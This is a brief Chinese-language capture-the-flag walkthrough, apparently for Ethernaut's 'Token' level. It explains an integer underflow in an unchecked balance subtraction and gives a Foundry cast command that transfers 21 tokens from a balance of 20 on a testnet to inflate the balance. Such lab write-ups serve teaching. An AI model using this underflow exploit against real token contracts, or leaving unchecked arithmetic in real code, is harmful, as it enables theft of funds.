### 第5关：Token

balances[msg.sender] -= _value;
这里没有做安全限制，我们的初始余额是20，如果用它减去 21，则会发生数据下溢，结果为 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff

先点击 Get new instance, F12 查看本关的合约地址 0xAAAAAAAAAAAAAAAAAAAA ，然后使用 Foundry Cast 调用 transfer(address, uint256),随便向另外一个地址转账 21个代币。即可让自己的代币余额发生溢出。得到一个天文数字：

 ```shell
cast send 0xAAAAAAAAAAAAAAAAAAAA "transfer(address, uint256)" 0xBBBBBBBBBBBBBBBBBBB 21 --rpc-url=https://sepolia-rollup.arbitrum.io/rpc --private-key=XXXXXXX
```

 点击 Submit Instance, 过关。
